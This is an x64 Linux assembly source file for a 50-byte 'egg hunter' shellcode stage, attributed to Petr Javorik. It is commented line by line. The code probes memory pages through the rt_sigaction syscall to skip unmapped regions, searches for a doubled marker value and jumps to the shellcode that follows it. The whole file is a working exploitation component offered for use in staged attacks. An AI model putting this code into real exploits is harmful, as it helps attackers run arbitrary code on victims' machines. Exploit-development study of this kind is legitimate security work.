; File: egghunter_memcheck.nasm
; Author: Petr Javorik
; Size: 50 bytes
; Description: rt_sigaction() x64 Linux egg hunter with memory checking

global _start

section .text

_start:

xor rsi, rsi   ; uncomment for better stability, size +2 bytes
;xor rdi, rdi   ; uncomment for better stability, size +2 bytes
xor rdx, rdx   ; uncomment for better stability, size +2 bytes
xor r9, r9     ; uncomment for better stability, size +2 bytes

add r9w, 4095   ; page_size-1 (0xfff)
push 8
pop r10         ; sigsetsize argument in rt_sigaction()

next_page:

    ; add 4095 to RSI via bitwise or
    or rsi, r9

next_address:

    inc rsi                 ; align to multiples of 4096 (0x1000)

    ; rt_sigaction() syscall 13
    push 13
    pop rax

    ; execute rt_sigaction()
    ; int rt_sigaction(                 // RAX = 13
    ;   int signum,                     // RDI = NULL
    ;   const struct sigaction *act,    // RSI = current_page
    ;   struct sigaction *oldact,       // RDX = NULL
    ;   size_t sigsetsize               // R10 = 8
    ; );
    syscall

    ; check for EFAULT
    ; Code for EFAULT is -14=0xfffffff2
    ; Checking just for last byte
    cmp al, 0xf2

    ; If EFAULT jump to next page in memory
    jz next_page

    ; If valid memory
    ; set EAX = egg, EDI = pointer_to_address_to_be_checked
    ; scasd compares both registers content
    ; if EAX == [EDI] then EDI+=4 and ZF=1
    mov eax, 0x464e464e
    mov rdi, rsi

    scasd
    jnz next_address    ; jump if EAX != [EDI]

    ; check for second egg occurrence
    scasd
    jnz next_address    ; jump if EAX != [EDI+4]

    ; egg found twice, RDI was increased 2x4 bytes by scasd
    ; so it now points directly to the shellcode
    jmp rdi
